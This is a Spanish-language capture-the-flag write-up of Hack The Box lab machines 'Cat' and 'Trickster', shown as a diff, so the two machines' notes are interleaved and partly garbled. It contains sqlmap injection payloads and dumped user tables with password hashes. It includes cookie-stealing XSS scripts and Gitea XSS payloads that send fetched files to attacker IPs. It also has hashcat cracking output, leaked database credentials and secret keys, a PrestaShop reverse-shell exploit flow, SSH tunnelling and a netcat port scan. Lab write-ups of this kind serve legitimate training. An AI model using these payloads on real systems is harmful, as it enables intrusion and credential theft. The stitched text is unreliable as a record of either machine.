-[*] starting @ 20:04:43 /2025-02-08/
-
-[20:04:43] [INFO] parsing HTTP request from 'request'
-[20:04:43] [INFO] testing connection to the target URL
-sqlmap resumed the following injection point(s) from stored session:
----
-Parameter: catName (POST)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: catId=1&amp;catName=test'||(SELECT 0x6b575974 WHERE 9070=9070 AND 3453=3453)||'
----
-[20:04:44] [INFO] testing SQLite
-[20:04:44] [INFO] confirming SQLite
-[20:04:44] [INFO] actively fingerprinting SQLite
-[20:04:44] [INFO] the back-end DBMS is SQLite
-web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (eoan or focal)
-web application technology: Apache 2.4.41
-back-end DBMS: SQLite
-[20:04:44] [INFO] fetching tables for database: 'SQLite_masterdb'
-[20:04:44] [INFO] fetching number of tables for database 'SQLite_masterdb'
-[20:04:44] [INFO] retrieved: 4
-[20:04:44] [INFO] retrieving the length of query output
-[20:04:44] [INFO] retrieved: 13
-[20:04:49] [INFO] retrieved: accepted_cats             
-[20:04:49] [INFO] retrieving the length of query output
-[20:04:49] [INFO] retrieved: 15
-[20:04:55] [INFO] retrieved: sqlite_sequence             
-[20:04:55] [INFO] retrieving the length of query output                        
-[20:04:55] [INFO] retrieved: 4                                                 
-[20:04:57] [INFO] retrieved: cats                                              
-[20:04:57] [INFO] retrieving the length of query output                        
-[20:04:57] [INFO] retrieved: 5                                                 
-[20:04:59] [INFO] retrieved: users                                             
-&lt;current&gt;                                                                      
-[4 tables]                                                                     
-+-----------------+                                                            
-| accepted_cats   |                                                            
-| cats            |                                                            
-| sqlite_sequence |
-| users           |
-+-----------------+
-<br>DUMP<br>$ sqlmap -r request -p catName --level=5 --risk=3 --dbms=sqlite --dump -T users --threads 10
-
-Table: users
-[12 entries]
-+---------+-------------------------------+----------------------------------+------------------------------------------------------------------------------------+
-| user_id | email                         | password                         | username                                                                           |
-+---------+-------------------------------+----------------------------------+------------------------------------------------------------------------------------+
-| 1       | axel2017@gmail.com            | d1bbba3670feb9435c9841e46e60ee2f | axel                                                                               |
-| 2       | rosamendoza485@gmail.com      | ac369922d560f17d6eeb8b2c7dec498c | rosa                                                                               |
-| 3       | robertcervantes2000@gmail.com | 42846631708f69c00ec0c0a8aa4a92ad | robert                                                                             |
-| 4       | fabiancarachure2323@gmail.com | 39e153e825c4a3d314a0dc7f7475ddbe | fabian                                                                             |
-| 5       | jerrysonC343@gmail.com        | 781593e060f8d065cd7281c5ec5b4b86 | jerryson                                                                           |
-| 6       | larryP5656@gmail.com          | 1b6dce240bbfbc0905a664ad199e18f8 | larry                                                                              |
-| 7       | royer.royer2323@gmail.com     | c598f6b844a36fa7836fba0835f1f6   | royer                                                                              |
-| 8       | peterCC456@gmail.com          | e41ccefa439fc454f7eadbf1f139ed8a | peter                                                                              |
-| 9       | angel234g@gmail.com           | 24a8ec003ac2e1b3c5953a6f95f8f565 | angel                                                                              |
-| 10      | jobert2020@gmail.com          | 88e4dceccd48820cf77b5cf6c08698ad | jobert                                                                             |
-| 11      | 1234@1234                     | 81dc9bdb52d04dc20036dbd8313ed055 | &lt;script&gt;document.location='http://10.10.14.232:2323/?c='+document.cookie;&lt;/script&gt; |                                                           
-| 12      | lol@htb.com                   | 81dc9bdb52d04dc20036dbd8313ed055 | &lt;script&gt;document.location='http://10.10.14.160:1110/?c='+document.cookie;&lt;/script&gt; |                                                           
-
-<br><img alt="Pasted image 20250210152417.png" src="machines/cat/imgs/pasted-image-20250210152417.png">]]]]></description><link>machines/cat/1-recon.html</link><guid isPermaLink="false">Machines/Cat/1 - Recon.md</guid><pubDate>Mon, 10 Feb 2025 14:24:19 GMT</pubDate><enclosure url="machines/cat/imgs/pasted-image-20250206115548.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/cat/imgs/pasted-image-20250206115548.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[2 -PrivEsc]]></title><description><![CDATA[ 
- <br>Bueno con las credenciales del usuario Rosa iniciamos sesion por ssh<br>rosa@cat:~$ cat us
-cat: us: No such file or directory
-rosa@cat:~$ cat use^C
-rosa@cat:~$ ls
-rosa@cat:~$ ls -la
-total 32
-drwxr-x--- 5 rosa rosa 4096 Jan 21 12:49 .
-drwxr-xr-x 6 root root 4096 Aug 30 23:19 ..
-lrwxrwxrwx 1 root root    9 Jan 21 12:49 .bash_history -&gt; /dev/null
--rw-r--r-- 1 rosa rosa  220 Aug  7  2024 .bash_logout
--rw-r--r-- 1 rosa rosa 3598 Sep  1 00:43 .bashrc
-drwx------ 2 rosa rosa 4096 Sep 13 00:59 .cache
-drwxrwxr-x 3 rosa rosa 4096 Sep 28 05:12 .local
--rw-r--r-- 1 rosa rosa  807 Aug  7  2024 .profile
-lrwxrwxrwx 1 root root    9 Aug 31 23:31 .python_history -&gt; /dev/null
-lrwxrwxrwx 1 root root    9 Jan 21 12:49 .sqlite_history -&gt; /dev/null
-drwx------ 2 rosa rosa 4096 Jan 14 17:08 .ssh
-rosa@cat:~$ cat /etc/passwd | grep bash
+<br>Envía la solicitud POST a /contact-us.
+<br><br>
+<br>Inicia un hilo para enviar solicitudes GET repetidas al archivo PHP malicioso (reverse_shell_new.php) en el servidor objetivo.
+<br>Inicia otro hilo para ejecutar el servidor HTTP local.
+<br><br>
+<br>Si la solicitud POST tiene éxito, inicia un servidor de escucha con ncat en el puerto 12345 para recibir la conexión inversa del shell.
+<br>Si se detecta una conexión, detiene todos los hilos.
+<br><br>Realiza una limpieza al finalizar:<br>
+<br>Elimina el archivo ZIP modificado (ps_next_8_theme_malicious.zip).
+<br>Elimina el archivo PHP  (reverse_shell.php).
+<br><br><br>Nos creamos una cuenta en el prestashop:<br>
+<img alt="Pasted image 20250213112820.png" src="machines/trickster/imgs/pasted-image-20250213112820.png"><br><img alt="Pasted image 20250213120710.png" src="machines/trickster/imgs/pasted-image-20250213120710.png"><br><br>$ cat /etc/passwd | grep -E "/bin/sh|/bin/bash"
 root:x:0:0:root:/root:/bin/bash
-axel:x:1000:1000:axel:/home/axel:/bin/bash
-rosa:x:1001:1001:,,,:/home/rosa:/bin/bash
-git:x:114:119:Git Version Control,,,:/home/git:/bin/bash
-jobert:x:1002:1002:,,,:/home/jobert:/bin/bash
-rosa@cat:~$ 
-<br>Vemos que el usuario no tiene el user.txt, pero hay otros usuarios con bash en el sistema como jobert o axel ; intentamos sacar sus passwords por hashacat con rockyou pero solo me saca la de Rosa y la mia <br>
-Watchdog: Temperature abort trigger set to 90c
+james:x:1000:1000:trickster:/home/james:/bin/bash
+adam:x:1002:1002::/home/adam:/bin/bash
+runner:x:1003:1003::/home/runner:/bin/sh
+<br>Seguimos en PrivEsc ---&gt; ]]></description><link>machines/trickster/1.recon.html</link><guid isPermaLink="false">Machines/Trickster/1.Recon.md</guid><pubDate>Thu, 13 Feb 2025 11:10:30 GMT</pubDate><enclosure url="machines/trickster/imgs/pasted-image-20250212101724.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/trickster/imgs/pasted-image-20250212101724.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[2.PrivEsc]]></title><description><![CDATA[ 
+ <br><br>Directorio /var/www<br>www-data@trickster:~$ ls -la
+total 20
+drwxr-xr-x  5 root     root     4096 Sep 13 12:24 .
+drwxr-xr-x 14 root     root     4096 Sep 13 12:24 ..
+drwxr-xr-x  2 root     root     4096 Sep 13 12:24 html
+drwxr-xr-x 28 www-data www-data 4096 Sep 17 18:07 prestashop
+drwxr-xr-x  5 www-data www-data 4096 Feb 13 15:09 trickster
+<br><br>www-data@trickster:~$ find / -perm -4000 -print 2&gt;/dev/null
+/snap/core20/2379/usr/bin/chfn
+/snap/core20/2379/usr/bin/chsh
+/snap/core20/2379/usr/bin/gpasswd
+/snap/core20/2379/usr/bin/mount
+/snap/core20/2379/usr/bin/newgrp
+/snap/core20/2379/usr/bin/passwd
+/snap/core20/2379/usr/bin/su
+/snap/core20/2379/usr/bin/sudo
+/snap/core20/2379/usr/bin/umount
+/snap/core20/2379/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2379/usr/lib/openssh/ssh-keysign
+/snap/core20/2318/usr/bin/chfn
+/snap/core20/2318/usr/bin/chsh
+/snap/core20/2318/usr/bin/gpasswd
+/snap/core20/2318/usr/bin/mount
+/snap/core20/2318/usr/bin/newgrp
+/snap/core20/2318/usr/bin/passwd
+/snap/core20/2318/usr/bin/su
+/snap/core20/2318/usr/bin/sudo
+/snap/core20/2318/usr/bin/umount
+/snap/core20/2318/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2318/usr/lib/openssh/ssh-keysign
+/snap/snapd/21759/usr/lib/snapd/snap-confine
+/usr/libexec/polkit-agent-helper-1
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/umount
+/usr/bin/mount
+/usr/bin/passwd
+/usr/bin/su
+/usr/bin/fusermount
+/usr/bin/gpasswd
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/snapd/snap-confine
+/opt/google/chrome/chrome-sandbox
+<br>GUID<br>www-data@trickster:~$ find / -perm -2000 -print 2&gt;/dev/null
+/var/spool/postfix/public
+/var/mail
+/var/local
+/var/log/journal
+/var/log/journal/add7a2fa4f114fc2b05f9d28de9f9bb3
+/var/log/mysql
+/run/log/journal
+/snap/core20/2379/usr/bin/chage
+/snap/core20/2379/usr/bin/expiry
+/snap/core20/2379/usr/bin/ssh-agent
+/snap/core20/2379/usr/sbin/pam_extrausers_chkpwd
+/snap/core20/2379/usr/sbin/unix_chkpwd
+/snap/core20/2379/var/mail
+/snap/core20/2318/usr/bin/chage
+/snap/core20/2318/usr/bin/expiry
+/snap/core20/2318/usr/bin/ssh-agent
+/snap/core20/2318/usr/sbin/pam_extrausers_chkpwd
+/snap/core20/2318/usr/sbin/unix_chkpwd
+/snap/core20/2318/var/mail
+/usr/bin/expiry
+/usr/bin/dotlockfile
+/usr/bin/crontab
+/usr/bin/chage
+/usr/bin/ssh-agent
+/usr/sbin/postqueue
+/usr/sbin/unix_chkpwd
+/usr/sbin/postdrop
+/usr/sbin/pam_extrausers_chkpwd
+/usr/lib/x86_64-linux-gnu/utempter/utempter
+/usr/local/share/fonts
 
-Host memory required for this attack: 2 MB
-
-Dictionary cache built:
-* Filename..: /usr/share/wordlists/rockyou.txt
-* Passwords.: 14344393
-* Bytes.....: 139921522
-* Keyspace..: 14344386
-* Runtime...: 2 secs
-
-81dc9bdb52d04dc20036dbd8313ed055:1234                     
-ac369922d560f17d6eeb8b2c7dec498c:soyunaprincesarosa       
-Approaching final keyspace - workload adjusted.
-<br>Vamos a probar a hacer privesc con Rosa:<br>No puedo ejecutar nada con sudo y en las conexiones vemos algunos puertos interesantes pero puede que sean reverse shelss de otros usuarios<br>rosa@cat:~$ sudo -l
-[sudo] password for rosa: 
-Sorry, user rosa may not run sudo on cat.
-rosa@cat:~$ netstat -tunlp
+<br><br>Revisamos las conexiones de la maquina<br>$ netstat -tulnp
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
 Active Internet connections (only servers)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
-tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:54383         0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
 tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:50391         0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:33189         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:41935         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
 tcp6       0      0 :::80                   :::*                    LISTEN      -                   
 tcp6       0      0 :::22                   :::*                    LISTEN      -                   
-udp        0      0 127.0.0.53:53           0.0.0.0:*                           -    
-<br>Como el usuario Rosa no podemos sacar mucha mas informacion acerca de las conexiones de la maquina<br>Netid       State        Recv-Q       Send-Q              Local Address:Port                Peer Address:Port       Process                             
-udp         UNCONN       0            0                   127.0.0.53%lo:53                       0.0.0.0:*           uid:101 ino:22269 sk:90 &lt;-&gt;        
-tcp         LISTEN       0            10                      127.0.0.1:587                      0.0.0.0:*           ino:26227 sk:91 &lt;-&gt;                
-tcp         LISTEN       0            37                      127.0.0.1:54383                    0.0.0.0:*           uid:1002 ino:28805 sk:92 &lt;-&gt;       
-tcp         LISTEN       0            4096                127.0.0.53%lo:53                       0.0.0.0:*           uid:101 ino:22270 sk:93 &lt;-&gt;        
-tcp         LISTEN       0            128                       0.0.0.0:22                       0.0.0.0:*           ino:24649 sk:94 &lt;-&gt;                
-tcp         LISTEN       0            128                     127.0.0.1:50391                    0.0.0.0:*           uid:1002 ino:26155 sk:95 &lt;-&gt;       
-tcp         LISTEN       0            4096                    127.0.0.1:3000                     0.0.0.0:*           uid:114 ino:26516 sk:96 &lt;-&gt;        
-tcp         LISTEN       0            10                      127.0.0.1:25                       0.0.0.0:*           ino:26226 sk:97 &lt;-&gt;                
-tcp         LISTEN       0            1                       127.0.0.1:33189                    0.0.0.0:*           uid:1002 ino:28704 sk:98 &lt;-&gt;       
-tcp         LISTEN       0            511                             *:80                             *:*           ino:24988 sk:99 v6only:0 &lt;-&gt;       
-tcp         LISTEN       0            128                          [::]:22                          [::]:*           ino:24651 sk:9a v6only:1 &lt;-&gt;   
-<br>Vamos a establecer un puente ssh con el puerto 3000 que parece interesante;<br>ssh rosa@cat.htb -L 3000:localhost:3000
-<br><br>BIngo! encontramos una web que hostea un repositorio de codigo local<br>
-<img alt="Pasted image 20250210154828.png" src="machines/cat/imgs/pasted-image-20250210154828.png"><br>El servicio se trata de <a data-tooltip-position="top" aria-label="https://news.ycombinator.com/item?id=31628939" rel="noopener nofollow" class="external-link" href="https://news.ycombinator.com/item?id=31628939" target="_blank">Gitea</a>, un servidor de git selfhosteado; ya me he visto en algunas ocasiones con este servicio ; si alguna parte de la web o algún servicio esta vinculado con el código que se sube podemos escalar privilegios; vamos a investigar<br>En el source code encontramos la version de gitea<br>Version:
-			
-				1.22.0
-<br><img alt="Pasted image 20250210155200.png" src="machines/cat/imgs/pasted-image-20250210155200.png"><br>Parece que esta version es vulnerable a XSS de nuevo<br>
-<a data-tooltip-position="top" aria-label="https://www.exploit-db.com/exploits/52077" rel="noopener nofollow" class="external-link" href="https://www.exploit-db.com/exploits/52077" target="_blank">XSS-Gitea</a><br>Pero las credenciales de Rosa no funcionan para logearse y tampoco nos permiten registrarnos en el servicio:<br><img alt="Pasted image 20250210155410.png" src="machines/cat/imgs/pasted-image-20250210155410.png"><br>Pero podemos loguearnos con OpenID ; si probamos nos promptea una direccion en local<br>
-<img alt="Pasted image 20250210155527.png" src="machines/cat/imgs/pasted-image-20250210155527.png"><br>
-Parece que el servidor busca OpenID's en la ruta /usr/login/opeid pero no la encuentro en el sistema;<br>
-Tambien intento pasarle mi servidor http pero no establece comunicacion <br><br>Encuentro esto en /var/log/apache.log :<br>cat /var/log/apache2/access.log | grep axel
-127.0.0.1 - - [11/Feb/2025:08:43:43 +0000] "GET /join.php?loginUsername=axel&amp;loginPassword=aNdZwgC4tI9gnVXv_e3Q&amp;loginForm=Login HTTP/1.1" 302 329 "http://cat.htb/join.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"
-<br>Pruebo sshing:<br>
-**<img alt="Pasted image 20250211094521.png" src="machines/cat/imgs/pasted-image-20250211094521.png"><br>Sudo -l :<br>axel@cat:~$ sudo -l
-[sudo] password for axel: 
-Sorry, user axel may not run sudo on cat.
-<br><br>Hay mail para axel:<br>From rosa@cat.htb  Sat Sep 28 04:51:50 2024
-Return-Path: &lt;rosa@cat.htb&gt;
-Received: from cat.htb (localhost [127.0.0.1])
-        by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S4pnXk001592
-        for &lt;axel@cat.htb&gt;; Sat, 28 Sep 2024 04:51:50 GMT
-Received: (from rosa@localhost)
-        by cat.htb (8.15.2/8.15.2/Submit) id 48S4pnlT001591
-        for axel@localhost; Sat, 28 Sep 2024 04:51:49 GMT
-Date: Sat, 28 Sep 2024 04:51:49 GMT
-From: rosa@cat.htb
-Message-Id: &lt;202409280451.48S4pnlT001591@cat.htb&gt;
-Subject: New cat services
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -              
+<br>Parece que hay un mysql abierto; era de esperar porque es necesario para el funcionamiento de la pagina web.<br>Vamos a hacer un fuzzeo del directorio de Prestashop para buscar algo relacionado con una base de datos ; seguramente mysql que es la que funciona en el puerto 3306:<br>grep -ri "mysql" /var/www/
+grep -risE "(mysql|dbname|db_user|db_password|db_host|database)" /var/www/
+<br>Encuentro informacion interesante en la siguiente ruta<br>/var/www/prestashop/var/cache/prod/FrontContainer.php
+<br>        return [
+            'database_host' =&gt; '127.0.0.1',
+            'database_port' =&gt; '',
+            'database_name' =&gt; 'prestashop',
+            'database_user' =&gt; 'ps_user',
+            'database_password' =&gt; 'prest@shop_o',
+            'database_prefix' =&gt; 'ps_',
+            'database_engine' =&gt; 'InnoDB',
+            'mailer_transport' =&gt; 'smtp',
+            'mailer_host' =&gt; '127.0.0.1',
+            'mailer_user' =&gt; NULL,
+            'mailer_password' =&gt; NULL,
+            'secret' =&gt; 'eHPDO7bBZPjXWbv3oSLIpkn5XxPvcvzt7ibaHTgWhTBM3e7S9kbeB1TPemtIgzog',
+            'ps_caching' =&gt; 'CacheMemcache',
+            'ps_cache_enable' =&gt; false,
+            'ps_creation_date' =&gt; '2024-05-25',
+            'locale' =&gt; 'en-US',
+            'use_debug_toolbar' =&gt; true,
+            'cookie_key' =&gt; '8PR6s1SJZLPCjXTegH7fXttSAXbG2h6wfCD3cLk5GpvkGAZ4K9hMXpxBxrf7s42i',
+            'cookie_iv' =&gt; 'fQoIWUoOLU0hiM2VmI1KPY61DtUsUx8g',
+<br><br>Bueno como dirian mis colegas del sector "we're in"<br>
+<img alt="Pasted image 20250213163524.png" src="machines/trickster/imgs/pasted-image-20250213163524.png"><br>MariaDB [(none)]&gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| prestashop         |
++--------------------+
+<br>De la base de datos saco las siguientes credenciales;<br>admin@trickster.htb : $2y$10$P8wO3jruKKpvKRgWP6o7o.rojbDoABG9StPUt0dR7LIeK26RdlB/C
+james@trickster.htb : $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm
+<br>Identificamos los hashes:<br>➜  Trickster hashcat credentials 
+hashcat (v6.2.6) starting in autodetect mode
 
-Hi Axel,
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #1: cpu-haswell-AMD Custom APU 0405, 6360/12785 MB (2048 MB allocatable), 8MCU
 
-We are planning to launch new cat-related web services, including a cat care website and other projects. Please send an email to jobert@localhost with information about your Gitea repository. Jobert will check if it is a promising service that we can develop.
+The following 4 hash-modes match the structure of your input hash:
 
-Important note: Be sure to include a clear description of the idea so that I can understand it properly. I will review the whole repository.
+      # | Name                                                       | Category
+  ======+============================================================+======================================
+   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
+  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
+  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
+  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce
 
-From rosa@cat.htb  Sat Sep 28 05:05:28 2024
-Return-Path: &lt;rosa@cat.htb&gt;
-Received: from cat.htb (localhost [127.0.0.1])
-        by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S55SRY002268
-        for &lt;axel@cat.htb&gt;; Sat, 28 Sep 2024 05:05:28 GMT
-Received: (from rosa@localhost)
-        by cat.htb (8.15.2/8.15.2/Submit) id 48S55Sm0002267
-        for axel@localhost; Sat, 28 Sep 2024 05:05:28 GMT
-Date: Sat, 28 Sep 2024 05:05:28 GMT
-From: rosa@cat.htb
-Message-Id: &lt;202409280505.48S55Sm0002267@cat.htb&gt;
-Subject: Employee management
 
-We are currently developing an employee management system. Each sector administrator will be assigned a specific role, while each employee will be able to consult their assigned tasks. The project is still under development and is hosted in our private Gitea. You can visit the repository at: http://localhost:3000/administrator/Employee-management/. In addition, you can consult the README file, highlighting updates and other important details, at: http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md.
-<br>Puede que el Readme.md tenga info util<br>Vuelvo a Gitea con las nuevas credenciales:<br>- [ ] axel : aNdZwgC4tI9gnVXv_e3Q
-<br>Entramos como axel:<br><img alt="Pasted image 20250211094751.png" src="machines/cat/imgs/pasted-image-20250211094751.png"><br><br>Para triggerear el XSS debemos ir a un repositorio creado previamente y darle a settings , en el campo "description " es donde podemos injectar el XSS; mas info en <a data-tooltip-position="top" aria-label="https://www.exploit-db.com/exploits/52077" rel="noopener nofollow" class="external-link" href="https://www.exploit-db.com/exploits/52077" target="_blank">exploit.db</a><br>
-<img alt="Pasted image 20250211095138.png" src="machines/cat/imgs/pasted-image-20250211095138.png"><br>
-<img alt="Pasted image 20250211095254.png" src="machines/cat/imgs/pasted-image-20250211095254.png"><br>Funciona!<br>
-<img alt="Pasted image 20250211095608.png" src="machines/cat/imgs/pasted-image-20250211095608.png"><br>Modificamos el XSS para robar el Readme.md y que me lo envie a mi servidor:<br>&lt;a href='javascript:fetch("http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md").then(response=&gt;response.text()).then(data=&gt;fetch("http://10.10.14.232:2323/?d="+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));'&gt;XSS test&lt;/a&gt;
-<br>Despues de mandarle un mail a jobert tenemos un callback<br>
-mail:<br>axel@cat:~$ echo -e "Subject: Test \n\n check this mdfck http://localhost:3000/axel/XSS" | sendmail jobert@cat.htb
-<br>10.10.11.53 - - [11/Feb/2025 10:35:36] "GET /?d=IyBFbXBsb3llZSBNYW5hZ2VtZW50ClNpdGUgdW5kZXIgY29uc3RydWN0aW9uLiBBdXRob3JpemVkIHVzZXI6IGFkbWluLiBObyB2aXNpYmlsaXR5IG9yIHVwZGF0ZXMgdmlzaWJsZSB0byBlbXBsb3llZXMu HTTP/1.1" 200 -
+<br>Creds :<br>
+Crackeamos las passwords con hashcat o john <br>john credentials --wordlist=/usr/share/wordlists/rockyou.txt
+hashcat -m 3200  credentials /usr/share/wordlists/rockyou.txt 
+<br>james : alwaysandforever
+<br><br>Nos logeamos por ssh<br>➜  Trickster ssh james@trickster.htb
+The authenticity of host 'trickster.htb (10.10.11.34)' can't be established.
+ED25519 key fingerprint is SHA256:SZyh4Oq8EYrDd5T2R0ThbtNWVAlQWg+Gp7XwsR6zq7o.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'trickster.htb' (ED25519) to the list of known hosts.
+james@trickster.htb's password: 
+Last login: Thu Sep 26 11:13:01 2024 from 10.10.14.41
+james@trickster:~$ id
+uid=1000(james) gid=1000(james) groups=1000(james)
+james@trickster:~$ whoami
+james
+james@trickster:~$ 
+<br>Sudo -l :<br>james@trickster:~$ sudo -l
+[sudo] password for james: 
+Sorry, user james may not run sudo on trickster.
+<br>Revisando la configuracion de la red vemos que tenemos acceso a una red de docker pero no podemos ejecutar comandos de docker ya que james no forma parte del grupo docker:<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:50:56:94:e4:77 brd ff:ff:ff:ff:ff:ff
+    altname enp3s0
+    altname ens160
+    inet 10.10.11.34/23 brd 10.10.11.255 scope global eth0
+       valid_lft forever preferred_lft forever
+3: docker0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:18:3b:cb:65 brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+       valid_lft forever preferred_lft forever
+37: vethf843401@if36: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master docker0 state UP group default 
+    link/ether 0e:e5:f9:ea:9f:36 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+<br>viendo que tenemos una interfaz de ip's de docker vamos a escanear la red en búsqueda de posibles puntos de ataque;<br>Ya que nmap no esta  instalado en la maquina vamos a escanear la maquina con tecnicas lotl (living off the land)<br><a data-tooltip-position="top" aria-label="https://sevenlayers.com/index.php/blog/490-living-off-the-land-scanning" rel="noopener nofollow" class="external-link" href="https://sevenlayers.com/index.php/blog/490-living-off-the-land-scanning" target="_blank">Living  off the land tecniches : nmap</a><br><br>james@trickster:~$ for i in {1..254}; do ping -w 2 -c 1 172.17.0.$i | grep "64 bytes" | cut -d ' ' -f 4 | sed 's/://'; done;
 
-<br><img alt="Pasted image 20250211103602.png" src="machines/cat/imgs/pasted-image-20250211103602.png"><br>Esta en base64 lo descifro pero nada interesante<br><img alt="Pasted image 20250211103836.png" src="machines/cat/imgs/pasted-image-20250211103836.png"><br>Probamos con otro payload ; ahora vamos a leer el index.php<br>&lt;a href='javascript:fetch("http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php").then(response=&gt;response.text()).then(data=&gt;fetch("http://10.10.14.232:2323/?d="+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));'&gt;XSS test&lt;/a&gt;
-<br>Le volvemos a mandar el mismo mail a jobert para triggerear el xss de nuevo;<br>
-<img alt="Pasted image 20250211105340.png" src="machines/cat/imgs/pasted-image-20250211105340.png"><br><br>➜  Cat echo "PD9waHAKJHZhbGlkX3VzZXJuYW1lID0gJ2FkbWluJzsKJHZhbGlkX3Bhc3N3b3JkID0gJ0lLdzc1ZVIwTVI3Q01JeGhIMCc7CgppZiAoIWlzc2V0KCRfU0VSVkVSWydQSFBfQVVUSF9VU0VSJ10pIHx8ICFpc3NldCgkX1NFUlZFUlsnUEhQX0FVVEhfUFcnXSkgfHwgCiAgICAkX1NFUlZFUlsnUEhQX0FVVEhfVVNFUiddICE9ICR2YWxpZF91c2VybmFtZSB8fCAkX1NFUlZFUlsnUEhQX0FVVEhfUFcnXSAhPSAkdmFsaWRfcGFzc3dvcmQpIHsKICAgIAogICAgaGVhZGVyKCdXV1ctQXV0aGVudGljYXRlOiBCYXNpYyByZWFsbT0iRW1wbG95ZWUgTWFuYWdlbWVudCInKTsKICAgIGhlYWRlcignSFRUUC8xLjAgNDAxIFVuYXV0aG9yaXplZCcpOwogICAgZXhpdDsKfQoKaGVhZGVyKCdMb2NhdGlvbjogZGFzaGJvYXJkLnBocCcpOwpleGl0Owo%2FPgoK" | base64 -d
-&lt;?php
-$valid_username = 'admin';
-$valid_password = 'IKw75eR0MR7CMIxhH0';
+172.17.0.1
+172.17.0.2
+<br>Vemos que tiene conexion con 2 ips dentro del rango;<br>
+la 172.17.0.1 es la del propio host; mientras que la 172.17.0.2 parece de un container; vamos a investigar puertos abiertos<br><br>Escaneamos con nc el rango entero de puertos de la ip 172.17.0.2<br>james@trickster:~$ nc -vnz -w 1 172.17.0.2 1-65535 2&gt;&amp;1 | grep succeeded
+Connection to 172.17.0.2 5000 port [tcp/*] succeeded!
+<br>Tenemos conexion con el puerto 5000 vamos a hacer pivoting con ssh<br><br>Tenemos algun servicio corriendo en un docker en la ip 172.17.0.2 por el puerto 5000 vamos a hacer un puente con ssh para tener conexion con el puerto aunque podriamos hacer pivoting con chisel ,metaexploit o lingolo-ng;<br>➜  ~ ssh james@trickster.htb -L 5000:172.17.0.2:5000
+<br>Podemos escanear el puerto con nmap a ver si encontramos informacion del servicio; ahora que esta establecido el puente la conexion<br>sudo nmap -sCV -p 5000 -v -Pn -n localhost
+PORT     STATE SERVICE VERSION                                       
+5000/tcp open  http    Python http.server 3.5 - 3.10
+| http-title: Change Detection
+|_Requested resource was /login?next=/
+| http-methods: 
+|_  Supported Methods: HEAD OPTIONS GET
+<br>Nos encontramos ante un changedetection.io en la v0.45.20<br>
